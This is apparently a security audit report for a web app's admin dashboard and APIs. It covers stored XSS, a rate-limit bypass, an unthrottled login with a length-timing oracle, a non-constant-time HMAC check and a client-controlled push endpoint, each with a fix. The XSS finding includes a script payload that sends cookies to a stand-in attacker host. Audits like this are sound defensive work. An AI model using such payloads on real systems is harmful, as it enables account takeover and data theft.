## P0-1 — Stored XSS in admin dashboard via public quiz submission

**File:** `thomas.html:2528`
**Trigger:** anyone (no auth needed to submit a quiz)
**Impact:** full admin-session JS execution on `/thomas` the moment the admin opens the **Leads** tab.

### Code
```js
// loadQuizSubmissions, thomas.html:2521-2536
html += '<td><button class="btn btn-sm btn-gold" '
      + 'onclick="addLeadFromQuiz(' + JSON.stringify(JSON.stringify(s)) + ')">'
      + '+ Pipeline</button></td>';
```

The `s` object comes straight from `/api/dashboard/submissions` (which returns the raw `JSON.parse`’d quiz-submission blob from Redis). All visible rendering of `s.name` / `s.email` elsewhere in the row goes through `esc()`, but this one call pipes the whole blob through `JSON.stringify(JSON.stringify(...))` and drops it into an **HTML attribute**.

### Why double-stringify is not safe here

`JSON.stringify` escapes `"` as `\"` and `\` as `\\` so the result is a valid **JS string literal**. HTML attribute parsing does not understand backslash escapes — a literal `"` still closes `onclick="…"`, and a literal `>` still closes the tag. `<`, `>`, `/`, and `(` are passed through by `JSON.stringify` untouched.

### Concrete exploit

1. Attacker submits a quiz (no auth, `POST /api/submit-quiz`) with:
   ```json
   { "name": "x\"><script>fetch('https://attacker/'+document.cookie)</script>",
     "email": "a@b.co", "phone": "", "scores": [], "totalScore": 0, "page": "/" }
   ```
2. Payload is stored in the `quiz_submissions` ZSET verbatim.
3. Admin opens `/thomas` → **Leads** tab. The row renders as (approximately):
   ```html
   <button class="btn btn-sm btn-gold"
     onclick="addLeadFromQuiz("{\"name\":\"x\\\"><script>fetch(...)</script>...}")">
   ```
   Browser parses `onclick="addLeadFromQuiz("`, then the next `>` (inside the payload) closes the `<button>` tag, and the `<script>` runs as HTML content.
4. The admin session cookie is `HttpOnly` so `document.cookie` won’t directly leak it, **but** the admin dashboard is same-origin so the injected script can call every `/api/dashboard/*` endpoint as the admin (CRUD on clients, pipeline, revenue, Charleston applications, send-email to all clients, upload-video, delete-video, etc.) and exfiltrate any data they return.

### Suggested fix

Three options, cheapest first:
- Render the button with a `data-sub-id="…"` attribute (`esc()`-encoded) and look up `s` from the already-fetched array in the click handler, instead of embedding JSON into the attribute.
- Keep the JSON but HTML-escape the stringified result: `esc(JSON.stringify(s))` and `JSON.parse(this.dataset.sub)` on click.
- Replace inline `onclick` with `addEventListener` bound after `innerHTML`, passing the real object by closure.

The exact same pattern should be audited across the file; `grep -n "JSON.stringify(JSON.stringify" thomas.html` currently finds only this one call, but the pattern is a landmine worth a lint rule.

## P1-1 — Rate-limit bypass via `X-Forwarded-For` on all public submit endpoints

**Files:**
- `api/submit-quiz.js:23` (`ratelimit:quiz:{ip}` — 10/hr)
- `api/submit-email.js:28` (`ratelimit:email:{ip}` — 10/hr)
- `api/submit-chs-application.js:40` (`ratelimit:chs:{ip}` — 5/hr)

### Code
```js
const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'unknown';
const rateLimitKey = `ratelimit:quiz:${ip}`;
```

Vercel appends to `x-forwarded-for` rather than replacing it. If an attacker sends their own `X-Forwarded-For: 1.1.1.1`, Vercel forwards the Node runtime a header like `1.1.1.1, <real-ip>`, and the rate-limit key becomes the full string. Rotating the spoofed prefix on each request creates a new Redis bucket per request → unbounded submissions.

### Impact
- `submit-quiz` / `submit-email`: lead-list poisoning, Redis fill, cost of 1 Redis write per fake submission.
- `submit-chs-application`: same, plus every Charleston application appears in the admin inbox at `/thomas` → Charleston.

### Suggested fix
Prefer `x-real-ip` over `x-forwarded-for`, or if XFF is needed, take the **rightmost** entry (the one Vercel itself appended):
```js
const xff = (req.headers['x-forwarded-for'] || '').split(',').map(s => s.trim()).filter(Boolean);
const ip = xff[xff.length - 1] || req.headers['x-real-ip'] || 'unknown';
```

## P1-2 — No rate limit on admin login (`/api/dashboard/login`)

**File:** `api/dashboard/login.js` (whole file, 17 lines)

```js
const { password } = req.body;
if (!password || !verifyPassword(password)) {
  return res.status(401).json({ error: 'Invalid password' });
}
```

No counter, no backoff, no lockout, no CAPTCHA. The dashboard is a single-password admin console (`DASHBOARD_PASSWORD` env var); unlimited guesses are permitted, bounded only by Vercel’s per-second function limits.

### Compounding issue — length oracle in `verifyPassword`

`api/lib/auth.js:52-59`:
```js
function verifyPassword(input) {
  const expected = DASHBOARD_PASSWORD || '';
  const inputStr = input || '';
  if (inputStr.length !== expected.length) return false;   // ← early return
  ...
  return crypto.timingSafeEqual(inputBuf, expectedBuf);
}
```

The length check short-circuits before the timing-safe compare, so response-time (and server CPU) differs measurably between “wrong length” and “right length, wrong bytes.” An attacker can bisect the password length, then brute-force at the known length — without a rate limit, that’s plausible for anything under ~12 random chars or any common password.

### Suggested fix
- Rate-limit by IP (and/or add a Redis counter keyed on the admin session or just IP; 5 attempts per 15 min is standard).
- In `verifyPassword`, always run `timingSafeEqual` on same-length buffers (pad `input` to `expected.length` with a static byte, or hash both sides first).

The client-side (`api/client/login.js`) is better off thanks to PBKDF2 (100k iters), but it too has no attempt limiter — add the same rate-limit middleware there.

## P2-1 — Admin HMAC signature compared with `!==` (non-timing-safe)

**File:** `api/lib/auth.js:27`

```js
function verifyToken(token) {
  ...
  if (signature !== expected) return false;   // ← string compare
```

`api/lib/client-auth.js:46-49` already does this correctly with `crypto.timingSafeEqual`. The admin side quietly diverges.

**Why only P2:** forging an HMAC-SHA256 signature via remote timing is very hard in practice (sub-microsecond differences, lost in network jitter). But (a) the inconsistency with `client-auth.js` is a maintenance hazard — the next person refactoring the admin path may trust that it’s already hardened; (b) a correct fix is one line.

Also noted: `SESSION_SECRET` is read once at module load (`api/lib/auth.js:3`). If it is ever unset in production, `createHmac('sha256', undefined)` throws **at request time**, not boot time — a tiny defense-in-depth check at module load would be nicer. Not an active bug today.

### Suggested fix
```js
const sigBuf = Buffer.from(signature, 'hex');
const expBuf = Buffer.from(expected, 'hex');
if (sigBuf.length !== expBuf.length) return false;
if (!crypto.timingSafeEqual(sigBuf, expBuf)) return false;
```

## P2-2 — Client-controlled `subscription.endpoint` POSTed by admin notify

**Files:**
- `api/client/push-subscribe.js:16-25` — stores the entire client-supplied `body.subscription` without validating `endpoint`.
- `api/client/notify.js:62-69` — admin-triggered: `fetch(subscription.endpoint, { method: 'POST', body: payload })`.

A logged-in client can push-subscribe with `subscription.endpoint = "http://10.0.0.x/..."` or `"https://attacker.example/log"`. The next time an admin uses the dashboard’s “send push to client” for that client, the server does an outbound POST to the attacker-chosen URL carrying the notification JSON. On Vercel there is no real “internal” network to SSRF against, so this is mostly a weak outbound-request oracle / phone-home, hence P2 — but it’s also a trivial fix.

### Suggested fix
In `push-subscribe.js`, parse `subscription.endpoint` and allow-list known push-service origins:
```js
const u = new URL(body.subscription.endpoint);
const allowedHosts = ['fcm.googleapis.com','updates.push.services.mozilla.com','wns2-*.notify.windows.com'];
if (u.protocol !== 'https:' || !allowedHosts.some(h => matchHost(h, u.hostname))) {
  return res.status(400).json({ error: 'Unsupported push endpoint' });
}
```
